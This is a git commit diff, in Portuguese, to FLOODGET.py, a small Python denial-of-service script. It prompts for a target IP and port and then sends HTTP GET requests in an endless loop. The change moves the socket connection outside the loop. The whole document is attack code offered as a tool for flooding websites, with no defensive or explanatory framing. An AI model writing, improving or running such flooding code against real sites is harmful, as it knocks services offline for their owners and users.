ff421a597121a8c2e7402ae565d8113c42d4dac9
FelipeCR <138263642+MirrorWF@users.noreply.github.com>
2023-07-23 09:25:29 -0300

    Atualizar o FLOODGET.py

--- FLOODGET.py
+++ FLOODGET.py
@@ -24,10 +24,11 @@ alvo = input (Fore.GREEN + "\nDigite o IP do site: ")
 porta = int(input(Fore.YELLOW + "Digite a porta desejada: "))
 data = f"GET / HTTP/1.1\r\nHost: {alvo}\r\n\r\n"
 
-# Flood
+# Flood e Criação
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((alvo, porta))
+	
 while True:
-	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	client_socket.connect((alvo, porta))
 	client_socket.sendall(data.encode())
 	numero_sockets += 1
 	print (Fore.MAGENTA + f"{numero_sockets} Solicitação HTTP (Conexão Aberta)")
